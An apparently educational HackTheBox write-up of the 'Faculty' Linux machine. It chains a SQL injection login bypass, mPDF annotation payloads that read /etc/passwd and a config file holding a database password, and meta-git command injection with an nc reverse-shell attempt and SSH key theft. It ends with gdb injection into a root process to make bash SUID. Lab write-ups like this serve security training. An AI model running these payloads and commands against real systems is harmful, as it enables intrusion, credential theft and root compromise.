---
title: HTB | Faculty
author: Zeropio
date: 2022-08-29
categories: [Pentesting, HackTheBox]
tags: [htb, linux, medium, machines]
permalink: /pentesting/htb/machines/faculty
image:
  path: /assets/img/hackthebox/card/Faculty.png
  width: 800
  height: 500
---

# Fingerprint

The nmap show:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web redirect us to `/login.php`, asking for a ID. Testing some IDs (1,2,3…) we didn’t find anything. Trying to intercept the request with burp we see in the request a new page:

```
POST /admin/ajax.php?action=login_faculty HTTP/1.1
```

# Foothold

We see in that a page a login, easily bypassed with `' or '1'='1' #`.

We can download some of the pages as a pdf. Doing so will show us a new directory in the URL:

![Untitled](/assets/img/hackthebox/labs/faculty/Untitled.png)

We can search by **mpdf**, finding a vulnerabilty [here](https://github.com/mpdf/mpdf/issues/356). We can intercept the Burp request when creating a payload. We can see that it is url encoded two times and then base64 encode. We can use the same PoC as the vulnerability:

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

And encoded it as the same way:

```
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

In the attachment part of the pdf we can find the **passwd** file. We can see there two users with shell (apart from the root):

```
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

Trying to get the RSA of the users as:

```html
<annotation file="/home/developer/.ssh/id_rsa" content="/home/developer/.ssh/id_rsa"  icon="Graph" title="Attached File: /home/developer/.ssh/id_rsa" pos-x="195" />
```

Lead to an error generating the pdf.

Moving to the first page, we can see now some IDs. Loging with them redirect us to the schedule of each user. But while in the url we are in `faculty.htb/index.php`, Burp get the sites as a request to `/admin/ajax.php?action=get_schecdule` . If we go to that page without being loging, we can see an error.

![Untitled](/assets/img/hackthebox/labs/faculty/Untitled%201.png)

We can get this file with:

```html
<annotation file=" /var/www/scheduling/admin/admin_class.php" content=" /var/www/scheduling/admin/admin_class.php" icon="Graph" title="Attached File:  /var/www/scheduling/admin/admin_class.php" pos-x="195" />
```

Encoded as:

```
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBjb250ZW50PSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBpY29uPSUyNTIyR3JhcGglMjUyMiUyNTIwdGl0bGU9JTI1MjJBdHRhY2hlZCUyNTIwRmlsZTolMjUyMCUyNTIwL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

In this file we can see an include to **db_connect.php**. let’s get it:

```html
<annotation file=" /var/www/scheduling/admin/db_connect.php" content=" /var/www/scheduling/admin/db_connect.php" icon="Graph" title="Attached File:  /var/www/scheduling/admin/db_connect.php" pos-x="195" />
```

Encoded as:

```
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwJTI1MjIlMjUyMGNvbnRlbnQ9JTI1MjIlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjAlMjUyMC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

There we can see some credentials, but we don’t have the user.

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

We can try using them with SSH and the other two users we have. With gbyolo the credentials are valid.

# Privilege Escalation

We can use sudo with this user. Thanks to that we can see that we can run a command as developer:

```console
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

This report in [HackerOne](https://hackerone.com/reports/728040) told us about a vulnerability in meta-git, we can try doing it:

```console
gbyolo@faculty:~$ sudo -u developer meta-git clone 'poc | whoami'
	meta git cloning into 'poc | whoami' at poc | whoami
	
	poc | whoami:
	poc | whoami: command 'git clone poc | whoami poc | whoami' exited with error: Error: spawnSync /bin/sh EACCES
```

At first we got an error. That’s why developer doesn’t have access to our home. Let’s do it from a path that both accounts can get:

```console
gbyolo@faculty:/$ sudo -u developer meta-git clone 'test | whoami'
	meta git cloning into 'test | whoami' at test | whoami
	
	test | whoami:
	developer
	fatal: repository 'test' does not exist
	whoami: extra operand ‘test’
	Try 'whoami --help' for more information.
	test | whoami ✓
```

So we can execute code as developer. Trying a reverse shell result in failure:

```console
gbyolo@faculty:/$ sudo -u developer meta-git clone 'test | nc -e sh 10.10.16.44 443'
```

Let’s try getting the RSA:

```console
gbyolo@faculty:/$ sudo -u developer meta-git clone 'poc | cat ~/.ssh/id_rsa'
```

And we got it. We can now connect as developer, but where are not root yet. Using **linpeas** we can see some attacks paths. We see that we have access to `gdb`. We can make gdb take a root process and then make it execute a shell.

Search a process the root is using with a shell, for example Python:

```console
developer@faculty:~$ ps faux | grep ^root | grep python3
```

Then attach gdb to that process:

```console
developer@faculty:~$ gdb -p 3154
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 27552]
(gdb) quit
```

Now execute the shell:

```console
developer@faculty:~$ bash -p
bash-5.0# whoami
root
```
